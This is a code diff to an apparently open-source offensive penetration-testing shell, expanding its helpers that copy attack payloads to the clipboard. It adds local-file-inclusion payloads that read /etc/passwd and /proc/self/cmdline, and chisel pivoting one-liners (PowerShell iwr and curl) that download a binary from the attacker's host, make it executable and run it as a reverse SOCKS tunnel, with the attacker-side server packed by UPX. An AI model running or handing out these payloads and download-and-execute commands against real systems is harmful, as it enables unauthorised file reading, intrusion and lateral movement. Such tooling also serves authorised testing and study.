@@ -1639,7 +1639,7 @@ class LazyOwnShell(Cmd):
         )
         os.system(f"echo '{line}' > sessions/hash.txt")
         print_msg(f"Analisando sessions/hash.txt con Name-the-hash {RESET}")
-        os.system(f"nth -t {line}")
+        os.system(f"nth -t '{line}'")
 
         return
 
@@ -2117,12 +2117,29 @@ class LazyOwnShell(Cmd):
 
     def do_wrapper(self, line):
         """copy to clipboard some wrapper to lfi"""
-        print_msg(
-            f"Copy to clipboard: {RED} php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd{RESET}"
-        )
-        os.system(
-            "echo 'php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd' | xclip -sel clip"
-        )
+        
+        command1 = "echo ' php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd' | xclip -sel clip"
+        command2 = "echo ' file:///proc/self/cmdline' | xclip -sel clip"
+        command3 = "echo ' file:///etc/passwd' | xclip -sel clip"
+        
+        print_warn("<modo de uso>")
+        print_msg(f"{command1=}")
+        print_msg(f"{command2=}")
+        print_msg(f"{command3=}")
+        print_warn("</modo de uso>")
+        choice = input(f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1, 2 or 3): {RESET}").strip()
+
+        if choice == "1":
+            os.system(command1)
+            print_msg(f"Payload 1 copied to Clipboard")
+        elif choice == "2":
+            os.system(command2)
+            print_msg(f"Payload 2 copied to Clipboard")
+        elif choice == "3":
+            os.system(command3)
+            print_msg(f"Payload 3 copied to Clipboard")
+        else:
+            print_error("Invalid choice. Please select 1, 2 or 3.")        
         return
 
     def do_samrdump(self, line):
@@ -2328,10 +2345,11 @@ class LazyOwnShell(Cmd):
                 f"You must pass the port by argument ex:{GREEN} chisel 3333 {WHITE} more help: {CYAN} help chisel{RESET} "
             )
             return
-        if not os.path.exists("sessions/chisel_1.9.1_linux_amd64.gz"):
+        if not os.path.exists("sessions/chisel_1.9.1_linux_amd64.gz") or not os.path.exists('./sessions/chisel_1.9.1_windows_amd64.gz'):
             print_error(
-                f"You must run download_resources before run {GREEN}chisel {YELLOW}mode server {GREEN}at port {line}{RESET}"
+                f"You must run the command {GREEN}download_resources{YELLOW} before run {GREEN}chisel {YELLOW}mode server {GREEN}at port {line}{RESET}"
             )
+            return
 
         args = line.split(" ")
 
@@ -2343,11 +2361,33 @@ class LazyOwnShell(Cmd):
             command = f"""iwr -uri http://{lhost}/chisel.exe -OutFile pivot.exe ;"""
             command += " .\\"
             command += f"""pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks"""
-            cmdd = f"echo '{command}' | xclip -sel clip"
-            print_msg(f"{MAGENTA}Command to copy: {GREEN}{command}{RESET}")
-            os.system(cmdd)
+            command1 = f"echo '{command}' | xclip -sel clip"
+            
+            command = f"""curl http://{lhost}/chisel_1.9.1_linux_amd64 -o chisel ; chmod +x chisel ; """
+            command += " ./"
+            command += f"""chisel client -v {lhost}:{lport} R:127.0.0.1:socks"""            
+            command2 = f"echo '{command}' | xclip -sel clip"
+            
+            print_warn("<modo de uso>")
+            print_msg(f"{command1=}")
+            print_msg(f"{command2=}")
+            print_warn("</modo de uso>")
+
+            choice = input(f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1 or 2): {RESET}").strip()
+
+            if choice == "1":
+                os.system(command1)
+                print_msg(f"Payload 1 copied to Clipboard")
+            elif choice == "2":
+                os.system(command2)
+                print_msg(f"Payload 2 copied to Clipboard")
+
+            else:
+                print_error("Invalid choice. Please select 1 or 2")        
+                return            
+
             os.system(
-                f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe && upx chisel.exe && chmod +x chisel* && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} --socks5 -v"
+                f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x chisel* && upx chisel.exe && upx chisel_1.9.1_linux_amd64 && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} --socks5 -v"
             )
             print_msg(
                 f"Shutdown chisel tunnel at sessions in port {RED} {line} {RESET}"
